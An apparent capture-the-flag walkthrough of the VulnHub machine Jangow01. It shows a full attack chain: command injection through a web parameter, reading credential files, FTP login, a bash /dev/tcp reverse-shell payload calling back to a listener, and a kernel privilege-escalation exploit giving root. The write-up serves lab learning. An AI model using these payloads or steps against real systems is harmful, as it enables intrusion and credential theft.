<h1>Jangow01 - VulnHub Walkthrough</h1>

<h2>Description</h2>
<p>
Jangow01 is an easy-level VulnHub machine that focuses on enumeration, command injection,
credential discovery, and privilege escalation.
</p>

<hr>

<h2>Target Information</h2>
<<br><img width="555" height="112" alt="Screenshot 2026-03-23 225008" src="https://github.com/user-attachments/assets/a03103ed-8aeb-4a38-bea8-08d816fd158f" /><br>

<ul>
  <li><strong>Target IP:</strong> 10.0.2.15</li>
  <li><strong>Platform:</strong> VulnHub</li>
  <li><strong>Attacker Machine:</strong> Kali Linux</li>
</ul>

<hr>

<h2>1. Initial Enumeration</h2>

<p>
I started by scanning the target to identify open ports and services.
</p>

<pre><code>nmap -sV 10.0.2.15</code></pre>

<p>
The scan revealed:
</p>

<ul>
  <li>21/tcp → FTP</li>
  <li>80/tcp → HTTP</li>
</ul>

<p>
Since a web service was exposed, I focused on the HTTP attack surface.
</p>

<img width="492" height="98" alt="Screenshot 2026-03-23 121055" src="https://github.com/user-attachments/assets/8a2edfdd-3327-4eb7-aa93-90bf33e9b8d8" />


<hr>

<h2>2. Web Enumeration</h2>

<p>
While browsing the web application, I identified the following parameter:
</p>

<pre><code>/site/busque.php?buscar=</code></pre>

<p>
This parameter accepted user input directly, which made it a potential target for testing.
</p>

<img width="1056" height="70" alt="parameter_url" src="https://github.com/user-attachments/assets/26bb4bb0-47b3-40f8-bc4c-9aa44b733fd4" />


<hr>

<h2>3. Command Injection</h2>

<p>
To test for command execution, I injected a simple command:
</p>

<pre><code>echo test</code></pre>

<p>
The output was reflected in the response, indicating command execution.
</p>

<img width="1288" height="338" alt="echo test" src="https://github.com/user-attachments/assets/e1718d0e-7a81-4c7e-8ec8-a380a169d4ba" />


<p>
To confirm the execution context:
</p>

<pre><code>whoami</code></pre>

<p>
Result:
</p>

<pre><code>www-data</code></pre>

<p>
This confirmed remote command execution as the web server user.
</p>

<hr>


<h2>4. Credential Discovery</h2>

<p>
With command execution available, I explored the web directory:
</p>

<pre><code>ls -la /var/www/html</code></pre>
<br>-found hidden file .backup<br>
<img width="968" height="249" alt="list files www" src="https://github.com/user-attachments/assets/9eed5400-51da-4a4f-8d4e-fa29a5ed2f94" />
<pre><code>cat /var/www/html/.backup</code></pre>
<img width="1063" height="416" alt="image" src="https://github.com/user-attachments/assets/607d6643-5cd6-49a9-817b-c905a15481c1" />
<p>
This file contained credentials:
</p>
<pre><code>jangow01 : abygurl69</code></pre>

<p>
Inside the application, I found a WordPress directory and accessed a configuration file:
</p>

<pre><code>cat wordpress/config.php</code></pre>

<img width="1135" height="384" alt="image" src="https://github.com/user-attachments/assets/1ad4573f-de41-4434-b780-364bd7bad458" />


<p>
This file contained credentials:
</p>
<pre><code>desafio02 : abygurl69</code></pre>

<hr>

<h2>5. Credential Validation (FTP)</h2>

<p>
Since FTP was open, I tested the discovered credentials.
</p>

<pre><code>ftp 10.0.2.15</code></pre>

<p>
First attempt failed with another username.
</p><p>
Then I used the correct credentials:
</p>

<pre><code>
username: jangow01
password: abygurl69
</code></pre>

<img width="538" height="444" alt="logedinJangow" src="https://github.com/user-attachments/assets/c6bc9f7c-0938-47fb-976c-2d84fa644373" />

<p>
Login was successful.
</p>

<p>
I listed available files:
</p>

<pre><code>ls</code></pre>

<img width="919" height="388" alt="image" src="https://github.com/user-attachments/assets/e29f0565-4901-4d8d-b636-9ce79a3aabc6" />


<hr>
<h2>6. Reverse Shell</h2>

<p>
While command execution was possible through the web interface, interaction was limited. 
To gain a more stable and interactive shell, I needed to establish a reverse shell.
</p>

<pre><code>nc -lvnp 443</code></pre>

<p>
Then I used a reverse shell payload through the vulnerable parameter:
</p>

<pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/443 0&gt;&amp;1'</code></pre>

<p>
After executing the payload, I received a shell on my listener.
</p>
<strong>IMPORTANT NOTE: Payload must be encoded in order to work as expected. I used an online url encoder. <br>
<br><img width="1160" height="326" alt="image" src="https://github.com/user-attachments/assets/79e98c55-e464-40ff-a306-a4365e0f28d9" />



<p>
To stabilize the shell:
</p>
<img width="1076" height="150" alt="image" src="https://github.com/user-attachments/assets/50e612b4-3200-4879-a254-19eae8dd7477" />

<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>


<hr>

<h2>7. User Access</h2>

<p>
Using the same credentials, I switched to the local user:
</p>

<pre><code>su jangow01</code></pre>
<p>
Verification:
</p>

<pre><code>whoami</code></pre>

<pre><code>jangow01</code></pre>
<img width="1160" height="583" alt="image" src="https://github.com/user-attachments/assets/334c60ea-1133-418b-ba52-cb3ece07bddf" />





<p>
At this point, I had a stable shell as a valid system user.
</p>


<hr>

<h2>8. Local Enumeration</h2>

<p>
Next, I checked the kernel version:
</p>

<pre><code>uname -a</code></pre>

<img width="1160" height="88" alt="image" src="https://github.com/user-attachments/assets/4ba35129-a967-4a5a-bf10-458bba774719" />


<p>
The system was running:
</p>

<pre><code>Linux 4.4.0-31-generic</code></pre>

<p>
This is an outdated kernel with known privilege escalation vulnerabilities.
</p>

<hr>

<h2>9. Privilege Escalation</h2>

<p>
I initially tested one exploit, but it was unstable and kept retrying.
So I switched to another exploit compatible with this kernel.
</p>
<p><strong><img width="1166" height="520" alt="Screenshot 2026-03-23 231134" src="https://github.com/user-attachments/assets/31e01a2a-8a5e-43fd-8224-80f7d0167924" /></strong></p>
<p>
I compiled and executed the exploit:
</p>

<pre><code>
gcc 45010.c -o exploit2
chmod +x exploit2
./exploit2
</code></pre>

<p><strong><img width="1082" height="120" alt="ploit second" src="https://github.com/user-attachments/assets/5ece2a28-4eb9-4bec-b50f-a1b666ac4d40" />
</strong></p>

<p>
The exploit successfully patched credentials and spawned a root shell.
</p>

<hr>

<h2>10. Root Access</h2>

<pre><code>whoami</code></pre>

<pre><code>root</code></pre>

<p><strong><img width="1092" height="461" alt="root" src="https://github.com/user-attachments/assets/e6a82943-7b3e-4d13-a2c1-6035474fd9e0" />
</strong></p>

<hr>

<h2>11. Proof</h2>

<pre><code>
cd /root
cat proof.txt
</code></pre>

<p><strong><img width="1249" height="675" alt="DONE" src="https://github.com/user-attachments/assets/d750311a-1ce4-4a7f-b41d-139e62e17045" />
</strong></p>
<br><h3> ROOTED </h3>
<hr>

<h2>Summary</h2>

<ul>
  <li>Nmap enumeration</li>
  <li>Web parameter discovery</li>
  <li>Command injection</li>
  <li>Reverse shell access</li>
  <li>Credential extraction from config file</li>
  <li>FTP validation</li>
  <li>User pivot</li>
  <li>Kernel exploit</li>
  <li>Root access</li>
</ul>

<hr>

<h2>Additional Findings</h2>

<p>
During the interaction with the target system, several local files were created and retrieved
as part of the exploitation and testing process.
</p>

<p>
These included:
</p>

<ul>
  <li><code>40871.c</code> – initial exploit attempt (unstable)</li>
  <li><code>45010.c</code> – working privilege escalation exploit</li>
  <li><code>testCode.txt</code> – test file used to check write capabilities</li>
  <li><code>user.txt</code> – file retrieved via FTP</li>
</ul>

<p>
Although not all of these contributed directly to privilege escalation, they reflect
important steps during enumeration, testing, and exploitation workflow.
</p>
<h2>Key Takeaways</h2>

<ul>
  <li>Input validation failures lead to command injection</li>
  <li>Configuration files often expose credentials</li>
  <li>Reverse shells provide better control than web shells</li>
  <li>Privilege escalation depends on proper enumeration</li>
</ul>

<hr>

<h2>Disclaimer</h2>

<p>
This walkthrough was conducted in a controlled lab environment for educational purposes only.
</p>
